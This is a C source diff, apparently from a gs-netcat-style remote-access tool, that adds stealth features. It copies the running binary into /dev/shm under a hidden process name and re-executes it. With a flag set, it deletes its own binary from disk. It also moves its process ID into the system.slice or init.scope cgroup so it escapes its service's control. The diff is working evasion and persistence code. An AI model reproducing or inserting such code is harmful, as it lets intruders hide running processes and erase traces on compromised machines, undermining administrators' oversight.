@@ -69,6 +69,56 @@ add_env_argv(int *argcptr, char **argvptr[])
 	*argvptr = newargv;
 }
 
+// Copy myself into /dev/shm and try to execute myself.
+static int
+try_cpexecme(char *argv[]) {
+	int ret = -1;
+	int src = -1, dst = -1;
+
+	if (!(gopt.flags & GSC_FL_CPEXECME))
+		return -1; // continue
+
+	if (getenv("_GS_NOCPEXECME") != NULL) {
+		gopt.flags |= GSC_FL_DELME; // implied 
+		goto ok;
+	}
+
+	if (gopt.proc_hiddenname == NULL)
+		return -1;
+
+	setenv("_GS_NOCPEXECME", "1", 1);
+
+	char fn[512];
+	char buf[4096];
+	ssize_t sz;
+	if ((src = open(gopt.prg_exename, O_RDONLY | O_CLOEXEC)) < 0)
+		goto err;
+	snprintf(fn, sizeof fn, "/dev/shm/%s", gopt.proc_hiddenname);
+	if ((dst = open(fn, O_WRONLY | O_CREAT | O_CLOEXEC, S_IRWXU)) < 0)
+		goto err;
+
+	while (1) {
+		sz = read(src, buf, sizeof buf);
+		if (sz <= 0)
+			break;
+		if (write(dst, buf, sz) != sz)
+			break;
+	}
+
+	argv[0] = gopt.proc_hiddenname;
+	execv(fn, argv);
+	unlink(fn);
+	goto err;
+ok:
+	ret = 0;
+err:
+	XCLOSE(src);
+	XCLOSE(dst);
+	gopt.flags &= ~GSC_FL_CPEXECME;
+	unsetenv("_GS_NOCPEXECME");
+	return ret;
+}
+
 static void
 try_changeargv0(char *argv[]) {
 	char *exename;
@@ -77,15 +127,14 @@ try_changeargv0(char *argv[]) {
 	gopt.err_fp = stderr;
 #endif
 
-	if ((argv == NULL) || (argv[0] == NULL)) {
-		DEBUGF("argv not valid\n");
+	if ((argv == NULL) || (argv[0] == NULL))
 		return;
-	}
 	exename = argv[0];
 
 	if (GS_GETENV2("CONFIG_CHECK")) {
 		gopt.flags |= GSC_FL_CONFIG_CHECK;
 		GSNC_config_read(NULL /* default to GS_CONFIG_READ=*/);
+		gopt.flags &= ~(GSC_FL_CHANGE_CGROUP | GSC_FL_CPEXECME);
 		return;
 	}
 
@@ -97,9 +146,10 @@ try_changeargv0(char *argv[]) {
 	if ((ptr = getenv("_GS_PROC_EXENAME"))) {
 		// Called ourselves.
 		gopt.prg_exename = strdup(ptr);
-		DEBUGF("How hidden as ARGV0=%s [EXENAME=%s]\n", argv[0], gopt.prg_exename);
+		DEBUGF("Now hidden as ARGV0=%s [EXENAME=%s]\n", argv[0], gopt.prg_exename);
 		unsetenv("_GS_PROC_EXENAME");
 		GSNC_config_read(gopt.prg_exename);
+		gopt.flags &= ~(GSC_FL_CHANGE_CGROUP | GSC_FL_CPEXECME);
 		return;
 	}
 
@@ -122,12 +172,48 @@ try_changeargv0(char *argv[]) {
 		return;
 	}
 
+	if (try_cpexecme(argv) == 0)
+		return;
+
 	// HERE: Switch to argv0 to different name.
 	setenv("_GS_PROC_EXENAME", exename, 1);
 	argv[0] = gopt.proc_hiddenname;
 	execv(exename, argv);
 	DEBUGF("execv()=%s\n", strerror(errno));
 	// Silently ignore. Continue with current argv0 name.
+}
+
+static int
+changecgroup(const char *path) {
+	char buf[64];
+	int fd;
+	int ret = -1;
+
+	if ((fd = open(path, O_WRONLY | O_APPEND)) < 0)
+		return -1;
+
+	snprintf(buf, sizeof buf, "%d\n", getpid());
+	if (write(fd, buf, strlen(buf)) < 0)
+		goto err;
+
+	ret = 0;
+err:
+	close(fd);
+	return ret;
+}
+
+static void
+try_changecgroup(void) {
+	if (!(gopt.flags & GSC_FL_CHANGE_CGROUP))
+		return;
+
+	// cgroup v1
+	if (changecgroup("/sys/fs/cgroup/system.slice/cgroup.procs") == 0)
+		return;
+
+	// cgroup v2
+	if (changecgroup("/sys/fs/cgroup/init.scope/cgroup.procs") == 0)
+		return;
 }
 
 void
@@ -150,7 +236,17 @@ init_defaults1(char *argv[]) {
     if ((ptr == NULL) || (*ptr != '0'))
 		gopt.flags |= GSC_FL_WANT_CONFIG_READ;
 	
-	try_changeargv0(argv);
+	try_changeargv0(argv); // If wanted, calls GSNC_config_read()
+
+	// MUST be done before any fork() so that cgroup-change completes
+	// before returning control back to ExecStart
+	try_changecgroup();
+
+	// delete my own binary. (GS_DELME=1)
+	if ((gopt.flags & GSC_FL_DELME) && (gopt.prg_exename != NULL)) {
+		unlink(gopt.prg_exename);
+		XFREE(gopt.prg_exename);
+	}
 
 	gopt.prg_name = argv0;
 	if (argv0 != NULL) {
